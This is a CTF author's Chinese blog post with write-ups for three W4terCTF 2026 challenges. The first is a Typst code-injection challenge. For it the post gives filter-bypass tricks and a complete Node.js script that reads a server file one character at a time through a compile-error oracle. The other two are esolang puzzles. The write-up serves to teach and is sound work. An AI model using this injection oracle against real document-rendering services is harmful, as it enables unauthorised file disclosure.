#import "../../../config.typ": *
#import "@preview/cetz:0.4.2"

#show: template-post.with(
  title: "W4terCTF 2026 出题记录和题解",
  description: "本文包含了 W4terCTF 2026 中我出的三道题目以及对应的题解，分别为“优质 Flag 募集中”，“日历・序章”和“日历”。",
  tags: ("CTF",),
  category: "W4terCTF 合集",
  date: datetime(year: 2026, month: 5, day: 3)
)

#quote[
  我在前两年严肃掠夺 W4terCTF 奖金，导致我在 2026 年被禁止获得奖金了。#strike[为了能继续掠夺 W4terCTF 资金，于是]今年我以客串出题人的身份参加 W4terCTF 2026，提供了三道题目。在赛前，GZTime 给我的唯一一个要求是：“题目要足够有趣”，我也确实在朝着趣味性的方向准备题目（至于最后能不能让选手觉得有趣，那就不清楚了）。

  不得不承认，本次比赛的题目都属于 CTF 比赛中不太传统的题，这其中涉及比较多方面的因素，不过最大的因素果然还是我作为 ACM 选手不太擅长出正统 CTF 题目上吧。我在赛前其实已经做好因为非传统题型被喷的准备了……
]

= 优质 Flag 募集中！

#note(title: "题目信息")[
  - 分类：Misc
  - 难度：Medium
  - AI Policy：A1 受限（允许 AI 用于资料查询、概念解释、一般性咨询）

  #divider()

  Flag 作为不可再生资源，正在随着 W4terCTF 的举办而逐渐减少。W4terCTF 决定向世界募集下一场 CTF 比赛的 flag。只需要提交一个符合 flag 格式的字符串，就有机会成为未来某一场 W4terCTF 比赛的 flag。如果你的 flag 被选中，不仅可以获得丰厚的奖励，还能让全世界的选手在未来的比赛中为之奋斗！

  创建实例，访问网站并提交你的 flag 吧！
]

前言：本题是一道开放式题目，选手可以使用自己喜欢的方式凑出 Typst 代码，从而爆破出 flag。出这道题目的初衷是希望选手们通过查阅文档学习到一些奇奇怪怪的 Typst 小技巧。

在创建实例后，访问网站，可以看到一个 flag 募集页面。这个页面参考了 The Password Game 的设计，要求提交的 flag 符合特定的格式，并且还会对提交的 flag 进行一些检查。

#figure(
  image("/assets/image-1.png"),
  caption: "Flag 募集页面的截图"
)

观察网页的前端，可以确认在输入 flag 之后，将会通过 `/check` 接口和后端进行交互。后端将会按顺序检查给出的 flag，直到所有检查都通过，或者某个检查失败为止。检查的内容包括：

+ 你的 flag 应该是一个单行字符串，以 `W4terCTF{` 开头，以 `}` 结尾。后续称中间的部分为 flag 的内容。
+ flag 的内容长度至少为 100 个字符。
+ flag 内容必须包含至少一个大写字母、一个小写字母和一个数字。
+ flag 中不能包含空格，使用时必须通过下划线（`_`）代替。
+ flag 内容必须包含至少一个井号（`#`）。
+ flag 中不能包含连续 5 个英文字母，也不能包含连续 5 个数字。如果有需要，可以使用数字替换部分字母（例如用 1 替换 I，用 0 替换 O），反之亦然。
+ flag 的内容应该是一句话，因此 flag 内容的剩余字符（也就是除了大小写字母、数字、下划线和井号之外的部分）只能包含括号（`()`）、逗号（`,`）、句号（`.`）和冒号（`:`）。
+ flag 的内容不能带有提示性，因此你的 flag 内容中不能包含单词 `read` 和 `flag`。
+ 为了防止 flag 中携带敏感信息，你的 flag 内容不能包含 `cbor`、`csv`、`json`、`xml`、`toml` 和 `yaml` 等常见数据格式的名称。
+ 你说得对，但是中间忘了，总之你的整个 flag（而不是 flag 内容）必须是一个合法的 Typst 文档，并且能够在十秒内通过 Typst 0.14.2 的编译。

不妨梳理一下上述检查带来的信息：

- 首先，最后一个检查涉及到 Typst 文档的编译，注意到可以通过适当的 flag 控制编译的成功与否，因此可以从盲注的角度暴露出 flag。
- 其次，从第八个检查中可以大致猜测：通过 `read("flag")` 代码即可得到 flag 的内容。
- 最后，给出的 flag 需要满足前面所有需求，才能被 Typst 编译器编译。这不仅要求我们的 flag 不能包含 Typst 的任何读取函数之外，还不能有连续的五个字母，进一步限制了可以用的函数。

本题的几乎所有赛场做法都是非预期解。有不少的选手注意到，`eval` 函数并没有被禁止，于是只需要使用下面的代码就能构造出 `readflag`：

```typ
#eval(("r","e","a","d","(","\"","f","l","a","g","\"",")").join())
```

使用类似的方法，就能将一个 Typst 脚本代码塞进 `eval` 函数里面，那么问题就只剩下如何造出单个字符了。进一步注意到 `repr` 在本题中也没有禁止，因此可以使用各种方式构造出你想要的字符，包括但不限于：

- 使用 ```typ #(X:1).keys().at(0)``` 构造 `X`，可以用于字母的构造；
- 使用 ```typ #str(a)``` 构造 `a`，可以用于数字的构造；
- 使用 ```typ #repr(...).at(...)``` 构造其他你需要的字母，可以考虑使用已有的数据类型，或者枚举 `sym` 库的所有元素。

*当然，本题的设计初衷并不是使用 `eval` 和 `repr` 并通过大量 dirty work 凑出结果。*在本题中，我设置了一个额外挑战：“尝试不使用 `eval` 和 `repr` 完成这道题目。另外，尝试使用不超过 500 次询问得到答案。”以下就是这道题目的期望做法：

从文档中可以发现标准库 `std` 包含了所有可以用到的基础函数，其中就包含了 `read`。`std` 作为 `module` 类型，不能像字典一样直接获取值，不过 Typst 允许使用字典的构造函数将一个 `module` 转化为一个字典，也就是 ```typ #dictionary(std)```。考虑到 `dictionary` 并不满足要求，因此可以使用 ```typ #type((:))``` 代替，也就是 ```typ #type((:))(std)```。这样就得到了 `std` 的字典表示：

```typ
( 
  bool: bool,
  int: int,
  float: float,
  str: str,
  label: label,
  bytes: bytes,
  content: content,
  array: array,
  dictionary: dictionary,
  ...
)
```

因此，使用 ```typ #type((:))(std).at("read")``` 就可以得到 `read` 函数了。为了得到 `"read"` 字符串，可以直接在 ```typ #type((:))(std).keys()``` 查找，但这个做法无法满足后面构造任意字符串的需求。进一步查看文档，注意到可以将字节序列 `bytes` 转化为字符串，而根据前面给出的字典表示，可以通过 ```typ #type((:))(std).at(type((:))(std).keys().at(5))``` 得到 `bytes` 函数，那么通过如下代码就可以构造出任意字符串：

```typ
#str(type((:))(std).at(type((:))(std).keys().at(5))(/* 字节数组 */))
```

这样，我们就获得了 `read` 函数，并可以构造出任意字符串。当然，你也可以使用 ```typ #str(..., base:36)``` 构造小写字母，然后进一步凑出需要的字符串。最后，如果想要确认 flag 的第 0 位是否为 `A` 或 `B`，可以使用如下方法：

```typ
#("A":1,"B":1).at(read("flag").at(0))
```

如果编译成功，则说明 flag 的第 0 位为 `A` 或 `B`，反之亦然。根据分析，其中所有的字符串和函数都可以被构造出来，那么通过二分的方式，就可以在不使用 `eval` 和 `repr` 的情况下，使用不超过 500 次询问得到 flag 了。以下是使用 Node.js 编写的 payload：

```js
import request from 'request';

const PORT = ...

const ask = async (flag) => {
  flag = "W4terCTF{" + "A0".repeat(50) + "#" + flag + "}"
  return new Promise((resolve, reject) => {
    request.post(`http://localhost:${PORT}/check`, {
      json: { flag },
    }, (err, res, body) => {
      if (err) return reject(err);
      resolve(body);
    });
  });
}

let std_dict = "type((:))(std)"
let str_bytes = std_dict + ".keys().at(5)"
let str_read = std_dict + ".keys().at(110)"

let func_bytes = std_dict + ".at(" + str_bytes + ")"
let func_read = std_dict + ".at(" + str_read + ")"

const construct_str = (str) => {
  str = str.split("").map(c => c.charCodeAt(0)).join(",")
  str = "(" + str + ",)"
  return "str(" + func_bytes + "(" + str + "))"
}

const construct_query = (l, r, ch) => {
  let arr = []
  for (let i = l; i < r; i++)
    arr.push(construct_str(String.fromCharCode(i)) + ":1")
  let dict = "(" + arr.join(",") + ")"
  return dict + ".at(" + ch + ")"
}

const construct_read_flag = () => {
  return func_read + "(" + construct_str("flag") + ")"
}

const construct_read_flag_at = (i) => {
  return construct_read_flag() + ".at(" + i.toString() + ")"
}

const work = async () => {
  let flag = "";
  for (let i = 0; !flag.endsWith("}"); i ++) {
    let l = 33, r = 127;
    while (l < r - 1) {
      let m = Math.floor((l + r) / 2);
      let query = construct_query(l, m, construct_read_flag_at(i))
      let res = await ask(query)
      if (res.result == 'error') {
        l = m;
      } else {
        r = m;
      }
    }
    
    console.log(i, String.fromCharCode(l));
    flag += String.fromCharCode(l);
  }
  console.log(flag);
}

work()
```

= 日历・序章

#note(title: "题目信息")[
  - 分类：PPC
  - 难度：Normal
  - AI Policy：A1 受限（允许 AI 用于资料查询、概念解释、一般性咨询）

  #divider()

  小 T 在不断练习括号序列匹配问题。为了让练习更容易一些，小 T 在每天会根据日历执行一个简单的操作。这样的练习一直持续到 2026 年 12 月 31 日，然而小 T 盼望的 2027 年没有到来——相反，他回到了 2026 年 1 月 1 日。

  小 T 瞬间意识到，自己进入了一个时间循环。他希望找到一个新的日历，使得即使在时间循环中也能正常完成练习。显然，小 T 不会规划每天需要执行的操作，因此他希望你能为他设计一个新的日历。身处时间循环之外的你可以从附件中查看循环和操作的细节。
]

这道题目给出了一份 Python 代码作为附件。观察附件，可以确认是一个 Esolang 的模拟器。这个 Esolang 包含了共 365 个可控的指令，每个指令对应日历中的一天。可控的存储单元包含一个无限大的栈、一个无限大的内存和 25 个寄存器（使用 `A` 到 `Y` 表示）。指令包含如下类型：

#figure(table(
  columns: 2,
  table.header(
    [指令], [功能]
  ),
  [`0` \~ `9`], [将对应的整数压入栈内],
  [`+` `-` `*` `/` `%`], [取出栈顶的两个元素，计算数值运算结果后压入栈内],
  [`&` `|` `^`], [取出栈顶的两个元素，计算位运算结果后压入栈内],
  [`<` `>`], [取出栈顶的两个元素，计算左移或右移结果后压入栈内],
  [`!`], [取出栈顶元素，若其为 0 则压入 1，否则压入 0],
  [`?`], [取出栈顶的两个元素，若次栈顶元素大于栈顶元素则压入 1，否则压入 0],
  [`#`], [取出栈顶元素，若其非 0 则额外前进一天],
  [`z`], [额外前进一天],
  [`Z`], [直接跳到下个月的第 1 天],
  [`[`], [从栈顶取出地址，在内存中查询后压入栈顶],
  [`]`], [从栈顶取出地址和一个值，在内存中写入该值],
  [`$`], [复制栈顶元素],
  [`A` \~ `Y`], [将栈顶的值存入对应的寄存器],
  [`a` \~ `y`], [将对应的寄存器的值压入栈内],
  [`.`], [弹出栈顶元素],
  [`@`], [终止程序]
)
)

另外需要注意：一年当中的时间是循环的，例如在 12 月份的某一天使用 `Z`，将会回到 1 月 1 日。也就是说，执行的执行流程为：

```cpp
while (1) {
  January();
  February();
  // ...
  December();
}
```

这道题目的输入通过内存给出，括号字符串按照顺序填写到内存中，以 `\0` 结尾。程序应当判断字符串是否为合法括号序列，将结果填写到内存的首位并终止程序。

考虑到本题中存在一个栈，因此可以直接在栈上完成操作，以下是可能的流程：

+ 将一些寄存器初始化为六种括号对应的 ASCII 值；
+ 维护一个指针寄存器，指向当前所在的字符。如果是 `\0` 则判断栈是否为空，然后停机，否则将字符存储到另一个寄存器中，并移动指针；
+ 如果是左括号，则直接压入栈内；
+ 如果是右括号，判断栈顶左括号是否匹配，若不匹配则停机。

不难发现，上述流程可以在十二个月的限制内达成。为了实现分支检查，可以使用 `#Z` 组合，表示在栈顶为 0 时跳转到下一个月，这样只有在满足某种限制的情况下才会执行某个月对应的操作。以下是一种可能的构造：

#import "calendar.typ" : get-calendar

#figure(
  auto-frame((
    get-calendar((
    "19+D4d*Ee1+F9d*1+Gg2+HZzzzzzzzz",
    "g3d*+2+Ii2+J2d*d*XZzzzzzzzzz",
    "p!#Zxb+0]b1+BZzzzzzzzzzzzzzzzzz",
    "p[Cp1+PZzzzzzzzzzzzzzzzzzzzzzz",
    "c!#Zb1-Bxb+[A0a!!]@Zzzzzzzzzzzz",
    "ce-!cg-!|ci-!|#Zxb+c]b1+BZzzzz",
    "cf-!#Zb1-Bxb+[Aae-!!#Z01]@Zzzzz",
    "ch-!#Zb1-Bxb+[Aag-!!#Z01]@Zzzzz",
    "cj-!#Zb1-Bxb+[Aai-!!#Z01]@Zzzz",
    "Zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
    "Zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
    "Zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"
    ))
  ), disable-filter: true),
  caption: [日历的构造示例]
)

= 日历

#note(title: "题目信息")[
  - 分类：PPC
  - 难度：Expert
  - AI Policy：A2 开放（允许不受限制地使用各类 AI 工具）

  #divider()

  #quote[
    小 T 在不断练习括号序列匹配问题。为了让练习更容易一些，小 T 在每天会根据日历执行一个简单的操作。这样的练习一直持续到 2026 年 12 月 31 日，然而小 T 盼望的 2027 年没有到来——相反，他回到了 2026 年 1 月 1 日。
  ]

  在发现自己被困在 2026 年之后，小 T 决定全职在家研究如何逃离这个时间循环。他发现：只要能接连不断完成 100 次数独挑战，就有可能打破这个循环。

  显然，小 T 不会规划每天需要执行的操作，因此他希望你能再次为他提供一个日历程序，来指导他每天应该执行什么操作。身处时间循环之外的你可以从附件中查看循环、操作和挑战的细节。
]

这道题开了 A2 之后，实际通过队伍比序章还要多……

这道题目的 Esolang 设计和上一题相同，但是目标发生了变化：给出一个*保证有解*的数独，存储到内存的前 81 个位置中，需要找到数独的一组解，并原地写入内存中。在这个限制下，就需要合理安排指令的排布了。

一种比较好的方式是使用二进制集合和位运算。例如，在内存中通过位运算记录某一行中数字对应的集合，例如二进制第 1 位为 1 表示这一行中已经存在 1，其他同理。对于一个数字 `S`，为了维护集合，可以使用下面的方法：

#figure(
  table(
    columns: 2,
    table.header(
      [指令], [功能]
    ),
    [`S += (1 << v)`], [将 `v` 加入到集合中],
    [`S -= (1 << v)`], [将 `v` 从集合中移除],
    [`(S >> v) & 1`], [检查 `v` 是否在集合中]
  )
)

考虑到实现 Dancing Links 之类的算法可能比较麻烦，因此可以使用带剪枝搜索的方式计算。以下是可能的计算流程：

+ 如果是第一次执行，枚举所有位置，将所有空位填到内存的某一段中，并初始化已有的行、列和宫格的数字集合；
+ 如果是第一次执行，将第一个未知数字压入栈顶；
+ 如果不是第一次执行，从栈顶取出未知数字所在的位置，如果所有位置都被确认则停机；
+ 如果刚刚从栈顶弹出了位置，则尝试“下一个需要尝试的数字”（因此，你还需要记录当前位置在尝试哪个数字），通过数字集合检测合法性后，将自身和下一个空位的状态压入栈顶。

以下是一种可能的构造：

#figure(
  auto-frame((
    get-calendar((
      "p!#Z99*$J9+$K9+$L9+Mjb?Ob9/Cb[F",
      "p!o&#Zb9%Dc3/3*d3/+EbGb1+BZz",
      "p!o&#Z1f<Fjc+$[f^]kd+$[f^]Zzzzz",
      "p!o&#Zle+$[f^]2f?#Zma+g]a1+AZz",
      "p!o!&#Z0001PZzzzzzzzzzzzzzzzzzz",
      "p#ZFGHah?!#z@mh+[BZzzzzzzzzzzz",
      "p#Zb9/Cb9%Dc3/3*d3/+E1g<OZzzzzz",
      "pf&#Zjc+$[o^]kd+$[o^]le+$[o^]Zz",
      "p#Zg1+G91+g?N0I1g<OZzzzzzzzzzz",
      "pn&#Zjc+[g>kd+[g>le+[g>||1&1^IZ",
      "pn&i&#Z1g<Ojc+$[o^]kd+$[o^]Zzz",
      "pn&#Zhg0i#Z.1h1+00bg]le+$[o^]Zz"
    ))
  ), disable-filter: true),
  caption: [日历的构造示例]
)

如果你对这个 Esolang 感兴趣的话，不妨尝试降低工作日（操作不属于 z、Z 或空格的日子）的数量。

= 后记

不得不说，为 CTF 赛事供题确实是比较新鲜的事情。在算法竞赛的 OJ 上，只需要提供题面和数据内容就能完成配置，而在 CTF 上就需要合理安排服务器文件架构，调整容器的安全策略，还需要保证可靠性和稳定性等等，比算法竞赛的工作量高了一些。在这里也感谢来自 W4terDr0p 的老前辈指导我完成题目的构建。

这几道题目中，“优质 Flag 募集中！”的想法在很早之前就确定了，不过当时的思路是编写一个带漏洞的 md2typ 组件；日历作为 Esolang 题目，在最开始其实存在一些废案，而最终版本是在比赛前三天准备好的。当时并没有使用 GPT 5.5 之类的强力模型进行测试（似乎当时这些模型还用不了），导致日历临时开了 A2，算是一些小失误了。不过从大家的 WriteUp 来看，有一些选手还是比较喜欢这些题目的（或者至少对其中某一题印象深刻），赢！

最后，作为之前研究过一些 Esolang 的人，这次能有机会设计 Calendar 这个 Esolang，确实是一件非常开心的事情！如果未来还能继续客串出题（或者直接作为 W4terDr0p 正式成员出题！？），我会继续努力出一些有趣的题的！